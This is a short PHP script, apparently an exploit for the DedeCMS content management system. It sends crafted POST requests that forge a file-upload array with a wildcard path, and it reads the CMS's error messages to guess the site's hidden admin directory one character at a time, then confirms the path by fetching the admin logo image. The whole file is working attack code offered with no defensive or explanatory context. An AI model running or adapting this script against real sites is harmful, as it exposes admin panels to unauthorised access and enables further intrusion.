<?php
$domain = 'http://test.cms.dedecms/';
$url = $domain . '/index.php';
function post($url, $data, $cookie = '') {
    $options = array(
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_HEADER => true,
        CURLOPT_POST => true,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_COOKIE => $cookie,
        CURLOPT_POSTFIELDS => $data,
    );
    $ch = curl_init($url);
    curl_setopt_array($ch, $options);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}
$testlen = 25;
$str = range('a', 'z');
$number = range(0, 9, 1);
$dic = array_merge($str, $number);
$n = true;
$nn = true;
$path = '';
while ($n) {
    foreach ($dic as $v) {
        foreach ($dic as $vv) {
            #echo $v.$vv .'----';
            $post_data = "dopost=save&_FILES[b4dboy][tmp_name]=./$v$vv</images/admin_top_logo.gif&_FILES[b4dboy][name]=0&_FILES[b4dboy][size]=0&_FILES[b4dboy][type]=image/gif";
            $result = post($url, $post_data);
            if (strpos($result, 'Upload filetype not allow !') === false) {
                $path = $v . $vv;
                $n = false;
                break 2;
            }
        }
    }
}
while ($nn) {
    foreach ($dic as $vvv) {
        $post_data = "dopost=save&_FILES[b4dboy][tmp_name]=./$path$vvv</images/admin_top_logo.gif&_FILES[b4dboy][name]=0&_FILES[b4dboy][size]=0&_FILES[b4dboy][type]=image/gif";
        $result = post($url, $post_data);
        if (strpos($result, 'Upload filetype not allow !') === false) {
            $path .= $vvv;
            echo $path . PHP_EOL;
            $giturl = $domain . '/' . $path . '/images/admin_top_logo.gif';
            if (@file_get_contents($giturl)) {
                echo $domain . '/' . $path . '/';
                $nn = false;
                break 2;
            }
        }
    }
}
?>